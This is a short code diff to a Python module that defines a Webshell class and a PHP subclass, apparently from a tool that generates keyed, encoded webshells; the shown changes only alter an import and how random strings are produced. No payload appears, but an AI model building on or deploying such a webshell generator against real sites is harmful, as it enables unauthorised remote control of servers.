@@ -1,6 +1,8 @@
-from . import encoder
+import myframework.encoder as encoder
 from os.path import dirname
 import random
+from string import ascii_letters,digits
+
 
 class Webshell:
     def __init__(self,key) -> None:
@@ -26,10 +28,10 @@ class Webshell:
     
     @staticmethod
     def get_random_string(num:int):
-        return random.randbytes(random.randint(1,num)).hex()
+        return ''.join(random.choice(ascii_letters + digits) for i in range(random.randint(1,num)))
     @staticmethod
     def get_random_string_len_fixed(num:int):
-        return random.randbytes(num).hex()
+        return ''.join(random.choice(ascii_letters + digits) for i in range(num))
 
 class PHP(Webshell):
     def __init__(self, key) -> None:
